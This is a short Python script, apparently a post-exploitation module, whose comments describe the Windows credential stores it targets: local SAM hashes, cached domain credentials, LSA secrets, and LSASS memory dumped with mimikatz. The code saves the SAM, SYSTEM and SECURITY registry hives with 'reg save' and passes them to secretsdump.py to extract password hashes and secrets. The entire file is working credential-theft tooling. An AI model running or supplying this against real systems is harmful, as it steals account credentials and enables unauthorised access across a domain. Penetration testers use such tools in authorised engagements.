# Local SAM Hashes

# Cached Domain Credentials:
#	These are the password hashes of domain users
#	that have logged on to the host previously.

# LSA Secrets:
#	Here, you will find account passwords for services that are set to run under
#	actual Windows user accounts (as opposed to Local System, Network Service and Local Service),
#	the auto-logon password and more.
#	If the Windows host is part of a domain, you will find the domain credentials of the machine
#	account with which you can authenticate to the domain to list domain users and admins as well
#	as browsing shares and so on.

# In-Memory Credentials:
#	Dump clear-text passwords from memory using mimikatz and the Windows Task Manager to dump the LSASS process.


# Make copy of the system, security and sam hives 
# Run secretsdump

import os
import subprocess
import shlex
import sys


def save_registry():
	os.system("reg save hklm\sam sam")
	os.system("reg save hklm\system system")
	os.system("reg save hklm\security security")

def run():
	save_registry()
	try:
		result = subprocess.check_output("secretsdump.py -system system -sam sam -security security LOCAL",stderr=subprocess.STDOUT, shell=True)
		return result
	except subprocess.CalledProcessError as e:
		raise RuntimeError("command {} return with error (code {}): {}".format(e.cmd, e.returncode, e.output))


